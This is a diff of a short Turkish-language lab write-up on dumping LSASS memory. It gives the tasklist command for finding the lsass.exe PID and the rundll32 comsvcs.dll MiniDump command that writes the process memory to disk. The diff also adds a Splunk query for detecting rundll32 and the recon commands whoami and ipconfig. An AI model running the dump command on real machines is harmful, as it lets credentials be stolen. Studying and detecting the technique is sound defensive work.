@@ -6,9 +6,17 @@ Saldırgan, LSASS sürecinin belleğini kopyalayarak sistem belleğinden düz me
 ## 🛠️ Uygulama (Windows Komut Satırı)
 `cmd.exe`'yi Yönetici (Administrator) olarak açtım. İlk olarak `tasklist` kullanarak `lsass.exe`'nin İşlem Kimliğini (PID) buldum. Ardından bellek dökümünü diske yazmak için `comsvcs.dll` içindeki `MiniDump` fonksiyonunu `rundll32.exe` ile tetikledim.
 
-```cmd
 1. lsass.exe'nin PID değerini bul
-tasklist | findstr lsass.exe
+'tasklist | findstr lsass.exe'
 
 2. LSASS belleğini kopyala (PID'nin 648 olduğu varsayılmıştır)
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 648 C:\temp\lsass.dmp full
+
+```spl
+index=windows Image="*\\rundll32.exe"
+| stats count by Computer
+```
+```cmd
+whoami
+ipconfig /all
+```
